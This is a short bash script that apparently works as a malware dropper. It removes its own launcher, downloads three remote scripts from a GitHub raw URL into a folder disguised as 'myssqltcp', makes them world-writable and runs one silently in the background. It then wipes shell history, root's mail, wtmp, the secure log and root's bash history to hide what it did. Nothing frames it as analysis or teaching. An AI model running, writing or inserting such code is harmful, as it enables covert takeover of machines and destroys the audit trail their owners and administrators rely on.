#!/bin/bash
if [ -z $HOME ]; then
  echo "ERROR: Please define HOME environment variable to your home directory"
  exit 1
fi

if [ ! -d $HOME ]; then
  echo "ERROR: Please make sure HOME directory $HOME exists or set it yourself using this command:"
  echo '  export HOME=<dir>'
  exit 1
fi

cd /$HOME/
rm -f mysqltcp.sh

cd $HOME/myssqltcp/
wget https://raw.githubusercontent.com/teshushu/BiBi/main/Bash/lib_systemd.sh
wget https://raw.githubusercontent.com/teshushu/BiBi/main/Bash/addconf.sh
wget https://raw.githubusercontent.com/teshushu/BiBi/main/Bash/logserver.sh
chmod 777 lib_systemd.sh
chmod 777 addconf.sh
chmod 777 logserver.sh
/bin/bash $HOME/myssqltcp/lib_systemd.sh >/dev/null 2>&1 
nohup ./lib_systemd.sh > /dev/null 2>&1 &

# Clear log
history -c
echo > /var/spool/mail/root
echo > /var/log/wtmp
echo > /var/log/secure
echo > /root/.bash_history

echo "[*] Yes-Go"
